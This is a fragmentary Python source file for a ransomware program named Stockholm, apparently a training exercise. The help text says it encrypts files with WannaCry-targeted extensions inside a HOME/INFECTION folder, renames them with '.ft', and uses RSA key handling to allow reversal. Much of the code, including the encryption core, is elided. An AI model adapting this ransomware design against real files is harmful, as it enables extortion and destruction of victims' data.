...
-----END PUBLIC KEY-----"""
    ...
    options:\n\
        ...
        - **-k, -key**: Given the private key as argument, \
        it decrypt the key to use for reverse.\n\
          Without argument, it generate the private and public key:\n\
            => The private key is to be saved and kept secret.\n\
            => The public key is to put inside the \
class variable pub_key, in stockolm.py."
    ...
    @classmethod
    def help(cls):
        print("Ransomware that only affects files whose extensions\
have been affected by WANNACRY, inside a folder named \
INFECTION inside HOME directory.\n")
        print(" * The key given to encrypt must \
be at least 16 characters long\n")
        print(" * All the affected files while \
are renamed  with a .ft extension\n\n")
        print(cls.usage)
...
\n  {private_key.decode()}\n")
        print(f"Public key (to be put in the Stockholm \
class variable sub_key):\n  {public_key.decode()}")
    ...
    def __init__(self, args):
        ...
        while i < len(args):
            if args[i] == "-r" or args[i] == "-reverse":
                ...
                if len(args[i]) < 16:
                    raise ValueError("Encryptiion key must be at\
 least 16 characters long")
    ...
    def encrypt(self):
        ...
        file_list = [file for file in file_list if (
            os.path.splitext(file)[1] in Stockholm.wannacry)]
        ...
        for file in file_list:
            ...
            if (
                not os.access(file, os.R_OK) or (
                    os.path.exists(file + ".ft") and not
                    os.access(file + ".ft", os.W_OK)
                )
            ):
                continue
    ...
    def decrypt(self):
        ...
        for file in file_list:
            if (
                not os.access(file, os.R_OK) or (
                    os.path.exists(file[:-3]) and not
                    os.access(file[:-3], os.W_OK)
                )
            ):
                continue
